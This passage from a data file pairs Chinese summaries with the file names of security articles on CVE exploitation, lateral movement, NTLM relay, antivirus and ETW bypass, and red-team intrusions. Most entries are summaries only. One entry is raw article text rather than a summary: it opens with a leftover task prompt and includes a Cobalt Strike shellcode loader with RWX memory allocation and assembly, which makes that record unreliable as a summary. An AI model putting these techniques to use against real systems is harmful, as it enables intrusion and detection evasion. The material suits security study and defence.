        "page_content": "该文档分析了 GoAhead Web 服务器中两个远程命令执行漏洞（CVE-2017-17562 和 CVE-2021-42342），这些漏洞允许攻击者通过利用 CGI 程序中的环境变量注入来执行任意命令。文档详细介绍了漏洞的原理、影响范围、补丁分析和利用方法，并提供了 Docker 镜像和 docker-compose 文件用于漏洞复现。",
        "FileName": "11511-GoAhead历史洞分析.pdf"
    },
    {
        "page_content": "该文档介绍了在无法获取服务器明文密码的情况下，如何利用 NTLM 哈希值进行横向移动，包括使用 Psexec、Atexec、Wmiexec、Smbexec 和 Mimikatz 等工具，以及如何使用哈希值进行 RDP 登录和批量爆破。",
        "FileName": "12550-内网PTH攻击.pdf"
    },
    {
        "page_content": "该文档分析了 Fastjson 1.2.80 中的漏洞，该漏洞利用异常类作为期望类，通过构造函数参数或 setter 方法将类添加到白名单缓存中，从而绕过黑名单限制。该漏洞已通过更新黑名单和移除异常类作为期望类的途径得到修复。",
        "FileName": "11727-某json 1.2.80 漏洞分析.pdf"
    },
    {
        "page_content": "该文档介绍了 NTLM 网络认证协议及其在 NTLM-Relay 攻击中的应用。NTLM 协议使用挑战-响应机制进行身份验证，而 NTLM-Relay 攻击利用了 LLMNR 和 NetBIOS 名称服务中的未经认证的广播，允许攻击者伪装成目标主机并窃取受害者的 Net-NTLM Hash，从而进行密码爆破或 NTLM 重放攻击。",
        "FileName": "12627-NTLM网络认证及NTLM-Relay攻击.pdf"
    },
    {
        "page_content": "本文探讨了内网渗透中流量转发和代理的技巧，重点关注一、二、三层网络环境下的不同方法。在单层网络中，正向和反向连接是常见的技术，而稳定性取决于代理软件和 VPS 传输。在二层网络中，使用 msf 添加路由和 socks 代理可以实现流量转发，而 ipsec 可用于在跳板主机上建立端口转发规则。在三层网络中，通过边缘主机进行流量转发是常见的策略。此外，本文还讨论了在二层网络中使用代理访问 web 后台和执行命令的情况。",
        "FileName": "10274-浅谈内网转发与流量代理.pdf"
    },
    {
        "page_content": "该文档详细描述了红队在一次攻防实战中通过信息收集、定位域控和提权等步骤成功入侵目标网络并获取域控权限的过程。红队利用开放的端口、文件上传漏洞和免杀马等技术，绕过安全防护，最终获得了域管权限，实现了外围打点和边界突破的目标。",
        "FileName": "9839-红队印象：柳暗花明+收米跑路.pdf"
    },
    {
        "page_content": "这篇文档主要介绍了攻防演练中外网打点的思路和方法，包括资产收集、处理和测试等步骤，涉及域名、IP、APP、交互系统等资产类型，并推荐了多种工具和技巧，如OneForAll、Eeyes、ServerScan、AppInfoScanner、Fofa、SNETCracker、BurpFastJsonScan、BurpShiroPassiveScan等。",
        "FileName": "9877-红队打点的那些事.pdf"
    },
    {
        "page_content": "**主题：**某 CMS 代码审计引发的思考\n\n**内容：**该文档分析了某 CMS 中存在的多个漏洞，包括文件上传、SQL 注入、任意文件下载和配置文件删除漏洞。这些漏洞主要是由于 frparam 函数未对输入参数进行过滤，导致攻击者可以控制下载 URL、SQL 查询和文件路径。通过利用这些漏洞，攻击者可以上传恶意脚本、执行任意 SQL 语句、下载任意文件并删除网站配置信息。",
        "FileName": "7775-某cms代码审计引发的思考.pdf"
    },
    {
        "page_content": "本文介绍了几个与世界杯相关的开源项目，包括提供比赛数据、实时共享屏幕、竞猜逻辑解析等功能，帮助用户更深入地了解和参与世界杯赛事。",
        "FileName": "11951-开源分享速进！这些开源项目助你玩转世界杯.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 Adobe Flash 0day 漏洞（CVE-2018-4878）在内网环境中进行渗透测试。它提供了详细的步骤，包括搭建内网环境、生成 shell 代码、编写利用程序、配置 Web 服务、开启 shell 会话监听、扫描内网中的漏洞主机，以及利用“永恒之蓝”漏洞攻击内网主机。最后，文档还提供了防护方案和参考链接。",
        "FileName": "7341-内网环境复现CVE - 2018 - 4878.pdf"
    },
    {
        "page_content": "该文档描述了作者在渗透测试中利用 ThinkPHP 框架的远程代码执行漏洞（TP-RCE）对一个简单的 BC 站点进行 getshell 的过程。作者通过构造恶意 payload，绕过禁用的系统命令，利用 file_put_contents 函数成功写入 shell，并连接菜刀进行控制。",
        "FileName": "9232-简单的BC站点getshell.pdf"
    },
    {
        "page_content": "该文档分析了 Apache Commons Collections 中的 Java 反序列化漏洞，该漏洞是 Java 历史上最著名的反序列化漏洞之一。文档介绍了 Java 反射机制的基础知识，并展示了如何使用反射链和 Transformer 类构建反序列化漏洞的攻击链。它还提供了利用 TransformedMap 和 LazyMap 类触发反序列化漏洞的具体示例，并提供了完整的利用代码。",
        "FileName": "8500-从apache-commons-collections中学习java反序列化.pdf"
    },
    {
        "page_content": "该文档主要介绍了对 xhcms 审计学习的总结，包括主题和内容。\n\n**主题：** xhcms 审计学习\n\n**内容：**\n\n* 分析了 xhcms 的文档结构和内容，包括目录结构、文件包含、数据库配置等。\n* 使用 seay 自动化代码审计工具扫描出 34 个可疑位置，并逐一分析和尝试利用。\n* 发现了多个 SQL 注入、XSS、CSRF 和越权漏洞，并提供了利用方法和修复建议。\n* 总结了审计过程中遇到的问题和经验教训，强调了精读代码和追溯变量的重要性。",
        "FileName": "11310-xhcms审计学习.pdf"
    },
    {
        "page_content": "该文档分析了 bluecms v1.6 sp1 代码中的安全漏洞，包括 SQL 注入、XSS、文件包含、任意文件删除和 SSRF 漏洞。这些漏洞主要由输入过滤不当、宽字节注入和直接拼接 SQL 语句等原因造成。",
        "FileName": "7074-bluecms v1.6 sp1 代码审计.pdf"
    },
    {
        "page_content": "该文档探讨了使用 certutil 命令在 360 核晶模式、火绒和 Defender 杀毒软件中绕过文件下载拦截。通过添加无效命令选项、复制 certutil 程序并更改其路径和文件名，以及使用特殊字符（如 ^ 和 \"）混淆命令参数，可以绕过这些杀毒软件的检测，成功下载指定文件。",
        "FileName": "12503-探究certutil在杀软中的绕过实践.pdf"
    },
    {
        "page_content": "该文档分析了某 CMS 系统中的 XSS 和 SQL 注入漏洞，重点关注了前端实体化编码和后端原始字符存储之间的差异，以及基于时间的延迟注入和拼接 SQL 语句的漏洞。文档还提供了 SQL 语句监控工具的链接，以帮助识别和利用 SQL 注入漏洞。",
        "FileName": "7861-某cms代码审计二.pdf"
    },
    {
        "page_content": "Java 反射机制是一种在运行时获取类信息和动态调用方法的机制，它通过反射 API 实现，包括获取类、方法、构造函数等信息，以及动态调用方法、实例化对象等功能。反射机制在 Java 开发中广泛应用，如动态加载类、动态调用方法、实现单例模式等。",
        "FileName": "7029-JAVA反序列化 - 反射机制.pdf"
    },
    {
        "page_content": "**主题：** Event Tracing for Windows (ETW) 绕过技术\n\n**内容：** ETW 是 Windows 系统中用于事件跟踪的机制，可收集系统事件和活动信息。安全软件通常订阅 ETW 事件以检测和防止攻击。本文介绍了 ETW 的组件、WinAPI 和内核函数，并讨论了通过补丁或挂钩这些 API 来绕过 ETW 监视的技巧。",
        "FileName": "12730-红队开发 - 事件追踪ETW (15) - 基础知识.pdf"
    },
    {
        "page_content": "CVE-2021-31956 漏洞是一个 NTFS.sys 中的提权漏洞，成因是整形溢出导致绕过条件判断，利用该漏洞可完成 Windows 提权。漏洞点位于 NtfsQueryEaUserEaList 函数中，该函数在处理文件扩展属性列表时，将检索到的值存储到缓冲区内，但没有检测整数下溢，导致堆上缓冲区溢出。利用该漏洞需要绕过检查，构造特定的扩展属性，并通过 WNF 实现任意内存读写，最终修改当前进程的 token 为 System 进程的 token，完成提权。",
        "FileName": "12034-CVE-2021-31956提权漏洞分析与利用.pdf"
    },
    {
        "page_content": "该文档描述了对某大学管理信息系统的渗透测试，利用了弱密码和逻辑漏洞，包括任意密码重置、越权查看和修改他人信息。测试者通过抓包和重放请求，绕过了验证码并修改了其他用户的密码，展示了该系统存在的安全漏洞。",
        "FileName": "7686-对某大学管理信息系统的一次渗透测试.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用 Slack Desktop 应用程序中的跳转漏洞来实现远程代码执行 (RCE)。该漏洞允许攻击者通过 HTML 注入和有效负载来绕过安全控制，从而在用户 PC 上执行任意命令。该文档提供了详细的步骤和有效负载，说明如何利用此漏洞，并强调了其对 Slack Desktop 用户的严重影响。",
        "FileName": "8250-Hackerone：利用 Slack Desktop 的跳转漏洞实现 RCE.pdf"
    },
    {
        "page_content": "CrossC2 通信协议 API 允许用户通过修改 C2-Profile 配置文件和编写自定义 C 代码来扩展 CobaltStrike 的通信功能。通过使用 C2-Profile 配置文件，用户可以指定元数据的编码和解码方式，而自定义 C 代码则用于处理元数据。本文档提供了两种实现方式，一种是直接修改 C2-Profile 配置文件，另一种是编写自定义 C 代码并将其编译成 .so 文件。通过使用这些方法，用户可以自定义 CobaltStrike 的通信协议，以满足特定的需求。",
        "FileName": "9935-CrossC2通信协议API的实践.pdf"
    },
    {
        "page_content": "该文档介绍了一种利用 Windows 事件日志隐藏恶意载荷的技术，攻击者可以通过将 shellcode 直接写入事件日志来掩盖恶意软件的使用，实现“无文件”攻击。该技术利用了事件日志可以存储二进制数据且具有合法 API 调用读取和写入的特性，从而绕过安全检测并实现持久化。",
        "FileName": "12251-巧用Windows事件日志“隐藏”载荷.pdf"
    },
    {
        "page_content": "该文档分析了骑⼠ CMS 中的远程命令执行漏洞，该漏洞是由 BaseController.class.php 文件中的 assign_resume_tpl 函数中过滤不严格导致的模板注入。攻击者可以通过构造恶意模板文件，在 POST 请求中提交该文件，从而在服务器上执行任意命令。",
        "FileName": "8520-骑士 CMS 远程命令执行分析.pdf"
    },
    {
        "page_content": "该文档重点介绍了渗透测试中登录页面的常见切入点，包括暴力破解、SQL注入、登录绕过、信息泄露和密码重置。它提供了详细的示例和技巧，帮助渗透测试人员识别和利用登录页面中的漏洞，从而获得对目标系统的访问权限。",
        "FileName": "8185-登录点测试的那些事.pdf"
    },
    {
        "page_content": "该文档介绍了对一个内网渗透靶场的渗透过程，涉及信息收集、漏洞利用、提权和横向移动等技术，最终获得了五个 flag 和一个 root.txt 文件。",
        "FileName": "10777-一次略坑靶场渗透（上）.pdf"
    },
    {
        "page_content": "phpBB 论坛软件中存在一个安全漏洞，攻击者可以利用管理员从后台切换到前台时泄露的 session id，结合 CSRF 和 XSS 漏洞，在目标服务器上实现存储型 XSS 攻击。",
        "FileName": "7829-phpBB从session id泄露到CSRF到XSS（CVE-2019-13376）.pdf"
    },
    {
        "page_content": "这篇文档介绍了如何使用 NodeJS Headless Chrome API (Puppeteer) 构建一个动态漏扫爬虫。它涵盖了 JS 基础、事件模型、原型链、URL 抓取、事件触发、去重、相似度计算、性能优化和并发调度等主题。",
        "FileName": "7064-NodeJS Headless 动态漏扫爬虫学习记录(爬虫篇).pdf"
    },
    {
        "page_content": "该文档分析了 ysoserial 中的 AspectJWeaver gadget，该 gadget 利用 Java 的 File 类和 HashSet 的实现原理，通过反射操作修改 HashMap 的键值对，最终写入文件。文档还讨论了 transient 修饰符在序列化中的作用，并提供了示例说明如何通过重写 readObject 和 writeObject 方法来强制序列化 transient 成员。",
        "FileName": "9297-认识AspectJWeaver.pdf"
    },
    {
        "page_content": "CVE-2019-13954 是 MikroTik RouterOS 中存在的 memory exhaustion 漏洞，认证用户通过构造并发送特殊 POST 请求，服务程序在处理 POST 请求时会陷入死循环，造成 memory exhaustion，导致对应的服务程序崩溃或系统重启。",
        "FileName": "11541-CVE-2019-13954 之MikroTik RouterOS memory exhaustion.pdf"
    },
    {
        "page_content": "该文档是一篇博客文章，主题是 Firefox-Hackbar-2.2.9 学习版。文章介绍了 Firefox-Hackbar-2.2.9 的功能和使用方法，并提供了下载链接。文章还包含了其他用户的评论和讨论。",
        "FileName": "7857-Firefox-Hackbar-2.2.9-学习版.pdf"
    },
    {
        "page_content": "该文档分析了区块链智能合约中的整数溢出漏洞，重点关注了加法、乘法和减法运算中的溢出问题。它提供了三个案例研究，展示了如何利用这些漏洞进行恶意转账，并讨论了防御措施，例如算术运算前后验证和使用 SafeMath 库。",
        "FileName": "9693-区块链整数溢出漏洞.pdf"
    },
    {
        "page_content": "**文档主题：** 分析如下文档并完成以下任务：\n\n**文档内容：**\n\n```\n1.登录 细谈 CS 分离式 shellcode 的加载之旅 细谈 CS 分离式 shellcode 的加载之旅 维⽣素泡腾⽚   /  2022-07-11 16:19:10  /  浏览数  9177 本⽂是炒冷饭系列，纯是⾃⼰⼊坑逆向不⻓时间，为了满⾜好奇⼼的⼼⾎来潮之作，如是⼊不了⼀些⾼⼿师傅的法眼，还请多指 教。 (^__^)  嘻嘻 …… 为了更好的分析，做最简单，最⽅便的准备⼯作。 ⾸先，⽤裸 ip 直接⽣成⼀个 cs 的 shellcode ，⽤的是分离式的 然后⽣成的是 x86 的，也就是 32 位的 c 语⾔的 shellcode 。 ⽣成代码其实就是⼀个⼤⼩千字节左右的，⽆符号字符数组，把这段 16 进制数放到 010editor （⼀个常⽤的编辑⼯具）⾥查看，除 了执⾏代码外，还有⼀部分写死的数据，⽐如 User-Agent ， IP 或域名等。 准备⼯作就把这段代码加载到内存去执⾏，来进⼀步分析，加载的代码如下： unsigned \t char \t buf [] \t = \t \" \\xfc\\xe8\\x89\\x00\\x00\\x00\\x60\\x89\\xe5\\x31 \\...( 省略 )\" ; void \t start () { \t\t\t\t printf ( \"begin....\" ); \t\t\t\t // 分配内存，可读可写可执⾏ \t\t\t\t char * start \t = \t ( char * ) VirtualAlloc ( NULL , \t sizeof ( buf ), \t MEM_COMMIT , \t PAGE_EXECUTE_READWRITE ); \t\t\t\t memcpy ( start , \t buf , \t sizeof ( buf )); \t\t\t\t __asm \t\t\t\t { \t\t\t\t\t\t\t\t mov \t eax , \t start \t\t\t\t\t\t\t\t call \t eax \t\t\t\t } } 我是⽤ vs 进⾏编译⽣成的，为了⽅便做⼀些修改，关掉随机基址 如果运⾏环境（虚拟机）和编译环境（物理机）不同，可以把运⾏库改成 MTD ，省的运⾏时候缺少模块报错，然后⽣成即可因为类似⽂章不少，所以我不卖关⼦，分离式 shellcode 第⼀阶段的主要任务是从远端再次加载⼀段 shellcode ，然后加载进⼊内存\n2.如果运⾏环境（虚拟机）和编译环境（物理机）不同，可以把运⾏库改成 MTD ，省的运⾏时候缺少模块报错，然后⽣成即可因为类似⽂章不少，所以我不卖关⼦，分离式 shellcode 第⼀阶段的主要任务是从远端再次加载⼀段 shellcode ，然后加载进⼊内存 进⾏执⾏，所以我们来看他是如何获取与加载的。 把⽣成的 exe ⽂件放到 X64dbg 中来调试（ 32 位的），进⼊之后先跳两次，获取了⼀下当前 EIP 位置 // 利⽤这种⽅式保存下⼀条语句的地址，即 EIP ，⽽这个位置很关键 call \t xxx 其他语句 pop \t ebp 然后跳到的位置是⼀段连续的，⾮常有规律的代码段，可以⼤胆推测，这是在调⽤⼀个统⼀的函数，⽽传⼊的参数的特点是，第⼀ 个参数（⼊栈顺序和参数顺序相反）是⼀串 4 个字节⼤⼩的 16 进制数，其他参数各有不同。 ⽽这第⼀个参数应该就是传说中的特征码 我们来跟进看⼀下这个所谓的 “ 函数 ” 做了什么，⾸先刚刚传⼊的参数中，除了特征码外，还有⼀个字符数组，其 ascii 值对应的字符 刚好就是 ‘wininet’ ，想必是要加载这个模块吧，那我们就带着这个问号，来看后⾯的执⾏过程 1. 第⼀阶段 1.1 功能函数第⼀段：了解的师傅会很熟悉，在三环 fs 寄存器存放的⼀个叫做 TEB 的结构体，也就是线程环境块，结构如下： 这个结构体位于 0x30 的位置，保存了当前的 PEB ，也就是进程环境块，该结构体如下： //0x480\tbytes\t(sizeof) struct \t _PEB { \t\t\t\t UCHAR \t InheritedAddressSpace ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t //0x0 \t\t\t\t UCHAR \t ReadImageFileExecOptions ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t //0x1 \t\t\t\t UCHAR \t BeingDebugged ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t //0x2 \t\t\t\t union \t\t\t\t { \t\t\t\t\t\t\t\t UCHAR \t BitField ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t //0x3 \t\t\t\t\t\t\t\t struct \t\t\t\t\t\t\t\t { \t\t\t\t\t\t\t\t\t\t\t\t UCHAR \t ImageUsesLargePages : 1 ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t //0x3 \t\t\t\t\t\t\t\t\t\t\t\t UCHAR \t IsProtectedProcess : 1 ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t //0x3 \t\t\t\t\t\t\t\t\t\t\t\t UCHAR \t IsImageDynamicallyRelocated : 1 ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t //0x3\n3.union \t\t\t\t { \t\t\t\t\t\t\t\t UCHAR \t BitField ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t //0x3 \t\t\t\t\t\t\t\t struct \t\t\t\t\t\t\t\t { \t\t\t\t\t\t\t\t\t\t\t\t UCHAR \t ImageUsesLargePages : 1 ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t //0x3 \t\t\t\t\t\t\t\t\t\t\t\t UCHAR \t IsProtectedProcess : 1 ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t //0x3 \t\t\t\t\t\t\t\t\t\t\t\t UCHAR \t IsImageDynamicallyRelocated : 1 ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t //0x3 \t\t\t\t\t\t\t\t\t\t\t\t UCHAR \t SkipPatchingUser32Forwarders : 1 ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t //0x3 \t\t\t\t\t\t\t\t\t\t\t\t UCHAR \t IsPackagedProcess : 1 ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t //0x3 \t\t\t\t\t\t\t\t\t\t\t\t UCHAR \t IsAppContainer : 1 ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t //0x3 \t\t\t\t\t\t\t\t\t\t\t\t UCHAR \t IsProtectedProcessLight : 1 ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t //0x3 \t\t\t\t\t\t\t\t\t\t\t\t UCHAR \t IsLongPathAwareProcess : 1 ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t //0x3 \t\t\t\t\t\t\t\t }; \t\t\t\t }; \t\t\t\t VOID * \t Mutant ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t //0x4 \t\t\t\t VOID * \t ImageBaseAddress ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t //0x8 \t\t\t\t // ⽬标位置 \t\t\t\t struct \t _PEB_LDR_DATA * \t Ldr ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t //0xc \t\t\t\t struct \t _RTL_USER_PROCESS_PARAMETERS * \t ProcessParameters ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t //0x10 \t\t\t\t //...( 省略 ) \t\t\t\t ULONG \t NtGlobalFlag2 ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t //0x478 }; \t _PEB_LDR_DATA \t 结构体如下： 在这个结构体中，位于 0xc ， 0x14 ， 0x1c 三处，有三个 LIST_ENTRY 类型的结构体，这三个结构体是⼀回事，都是保存着模块基址 的链表，只不过是以不同顺序排列的链表，加载顺序，内存中的顺序，初始化模块的顺序 //0x30\tbytes\t(sizeof) struct \t _PEB_LDR_DATA { \t\t\t\t ULONG \t Length ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t //0x0 \t\t\t\t UCHAR \t Initialized ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t //0x4 \t\t\t\t VOID * \t SsHandle ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t //0x8 \t\t\t\t struct \t _LIST_ENTRY \t InLoadOrderModuleList ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t //0xc \t\t\t\t // ⽬标位置 \t\t\t\t struct \t _LIST_ENTRY \t InMemoryOrderModuleList ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t //0x14 \t\t\t\t struct \t _LIST_ENTRY \t InInitializationOrderModuleList ; \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t //0x1c \t\t\t\t VOID * \t EntryInProgress ;\n4.InLoadOrderModuleList \t ，所以在 \t _PEB_LDR_DATA \t 结构体中的 \t LIST_ENTRY \t 中的⾸地 址，所指向的结构体的 0x8 位置 mov \t ebp , esp xor \t edx , edx mov \t edx , dword \t ptr \t fs :[ edx + 30 ] mov \t edx , dword \t ptr \t ds :[ edx + C \t\t\t\t // 获取描述第⼀个模块的 _LDR_DATA_TABLE_ENTRY 其中的 0x8 位置 mov \t edx , dword \t ptr \t ds :[ edx + 14 ] // 获取该模块 BaseDllName 的 buffer ，即模块名 mov \t esi , dword \t ptr \t ds :[ edx + 28 ] // 获取该模块名的最⼤⻓度 movzx \t ecx , word \t ptr \t ds :[ edx + 26 ] xor \t edi , edi xor \t eax , eax 如下图可以看到，第⼀个模块是 exe ⽂件本身 接下来⼀段代码，就⼗分有趣了，是计算哈希值的算法，也是⽐较传统的⽅式 ⼤概意思是，依次从⽂件名的字符数组中读取⼀个字符，⼤于 0x61 就减 0x20 （相当于⼩写变⼤写），然后累加，累加前要把上次 的求和循环右移 0xD 位 ",
        "FileName": "11508-细谈CS分离式shellcode的加载之旅.pdf"
    },
    {
        "page_content": "该文档介绍了 Java 反序列化漏洞的利用，包括基本概念、利用条件、实战演示和利用工具。它强调了利用 HashMap 和 URL 类中的 hashCode 方法来触发反序列化漏洞，并提供了使用 ysoserial 和 JNDI 的示例代码。文档还讨论了 Java Naming and Directory Interface (JNDI) 的概念，以及如何利用它来实现低耦合和高内聚。",
        "FileName": "12472-JAVA反序列化初食.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2020-17087 整数溢出漏洞，该漏洞存在于 Windows 内核驱动模块 cng.sys 中，可导致本地提权。漏洞成因是整数溢出导致越界读写，最终触发 BSOD。",
        "FileName": "11026-CVE-2020-17087整数溢出漏洞分析.pdf"
    },
    {
        "page_content": "本文介绍了使用 Vulhub 进行 Java 漏洞远程调试的方法。通过在启动 Jar 包时添加 `-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005` 参数，可以方便地使用 IDEA 进行远程调试。Vulhub 项目提供了漏洞源代码和 Dockerfile 文件，可以通过修改 Dockerfile 文件或直接使用 Vulhub-For-DebugJavaVul 项目来方便地进行调试。",
        "FileName": "12814-Java漏洞调试—利用Vulhub一键进行docker远程调试.pdf"
    },
    {
        "page_content": "该文档分析了 Spring 框架中的两个漏洞，CVE-2010-1622 和 CVE-2022-22965。它解释了这些漏洞的利用原理，包括参数绑定、数组覆盖、Java 内省和表单标签。文档还提供了漏洞修复方法，包括 Spring 和 Tomcat 的补丁。",
        "FileName": "11280-spring rce 从cve-2010-1622到CVE-2022-22965 篇一.pdf"
    },
    {
        "page_content": "本文档分析了 Python 沙箱逃逸的主题，并提供了绕过过滤和利用各种技术（如字符串处理、对象属性访问、内置函数和类继承）来执行命令的详细方法。",
        "FileName": "12303-python沙箱逃逸学习记录.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用技嘉驱动 gdrv.sys 中的任意地址读写漏洞 (CVE-2018-19320) 来绕过 Windows 上的驱动签名校验。该漏洞利用了 gdrv.sys 中的 memcpy 功能，允许攻击者将任意地址的内容复制到另一个地址，从而控制驱动校验变量并禁用驱动签名校验。该文档还提供了利用该漏洞的详细步骤，包括加载 CI.dll、获取控制驱动校验变量的地址以及使用任意地址写入漏洞覆盖该变量。",
        "FileName": "11277-关闭驱动校验bypass dse.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 Xunruicms 前台 RCE 漏洞进行渗透测试，包括分析漏洞、绕过过滤、利用 FCGIClient 类进行请求、加载恶意组件等步骤。",
        "FileName": "10003-记一次简单的渗透（三）.pdf"
    },
    {
        "page_content": "本文档介绍了使用 Django 框架开发 Web 漏洞扫描器的过程，包括使用的技术、功能和实现细节。该扫描器集成了漏洞检测、端口扫描、指纹识别、域名探测、目录扫描和一些实用工具，旨在满足渗透测试人员的需求。",
        "FileName": "7816-Django 初次尝试编写 Web 漏洞扫描器挖坑记录.pdf"
    },
    {
        "page_content": "本文档重点介绍了云原生场景下的 Kubernetes 安全威胁，分析了攻击者关注的技术点，包括 API Server 未授权访问、Kubernetes configfile 泄露、Docker Daemon 未授权访问、特权容器逃逸、CronJob 持久化、Capabilities 逃逸、污点横向渗透等，并提供了相应的攻击方法和防御措施。",
        "FileName": "10745-云原生之Kubernetes安全.pdf"
    },
    {
        "page_content": "本文档探讨了利用正则表达式回溯次数上限绕过 PHP 中的 preg_match 函数。通过发送超过 100 万个字符的输入，可以触发 PHP 的回溯次数限制，导致 preg_match 返回 false，从而绕过基于正则表达式的 Web 应用程序防火墙 (WAF) 的限制。",
        "FileName": "10219-利用正则回溯最大次数上限绕过preg_match.pdf"
    },
    {
        "page_content": "该文档介绍了一种基于机器学习的 GitHub 敏感信息泄露监控系统，该系统通过分析敏感信息样本，提取特征，建立机器学习模型，对 GitHub 上的告警信息进行识别和排除误报，从而降低敏感信息泄露的风险。",
        "FileName": "7805-基于机器学习的GitHub敏感信息泄露监控.pdf"
    },
    {
        "page_content": "该文档详细描述了作者在测试一个登录页面时发现的五个漏洞，并展示了如何利用这些漏洞来注册任意用户、修改密码、绕过修复措施以及使用不同的设备访问请求来发现新的漏洞。",
        "FileName": "8974-记一次短信验证码的梅开五度.pdf"
    },
    {
        "page_content": "该文档记录了一次 360 众测仿真实战靶场考核的经历，详细介绍了作者通过登录框注入、Referer 来源伪造、PHPMailer 远程命令执行等多种技术手段获取靶场分数的过程，并总结了考核中的经验教训，强调了随机应变和放松心态的重要性。",
        "FileName": "7547-记一次360众测仿真实战靶场考核WP.pdf"
    },
    {
        "page_content": "该文档分析了 Thinkphp5.0 反序列化链在 Windows 下无法写文件和在 Linux 下无法执行代码的问题，并提出了使用 `convert.iconv.*` 和 `convert.base64-decode` 过滤器组合解决这些问题的方案。",
        "FileName": "7457-Thinkphp5.0反序列化链在Windows下写文件的方法.pdf"
    },
    {
        "page_content": "本文探讨了DNS缓存投毒攻击，该攻击利用DNS解析链中的漏洞，通过注入恶意字符来污染DNS缓存，从而导致错误的解析结果和注入攻击。攻击者可以通过句点注入、CNAME重定向和DNS隧道传输恶意载荷等方式实施此攻击。为了解决此漏洞，建议对DNS记录进行验证和过滤，并使用SQLMap等工具自动完成此任务。此外，本文还介绍了通过扩展存储过程和Oracle PL/SQL包在Microsoft SQL Server和Oracle数据库中利用DNS渗出进行SQL注入攻击的技术。",
        "FileName": "11011-从一道题开始学习DNS缓存攻击.pdf"
    },
    {
        "page_content": "Apache Unomi 1.5.1 之前的版本存在 OGNL 注入漏洞 (CVE-2020-11975)，允许远程攻击者通过发送包含 OGNL 表达式的请求来执行任意代码，从而获得 Unomi 应用程序运行的权限。该漏洞已通过在 OgnlContext 中添加 SecureFilteringClassLoader 来修复，以防止计算/执行任意 OGNL 表达式。",
        "FileName": "8564-漏洞分析 - Apache Unomi RCE 第1篇 OGNL注入(CVE-2020-11975).pdf"
    },
    {
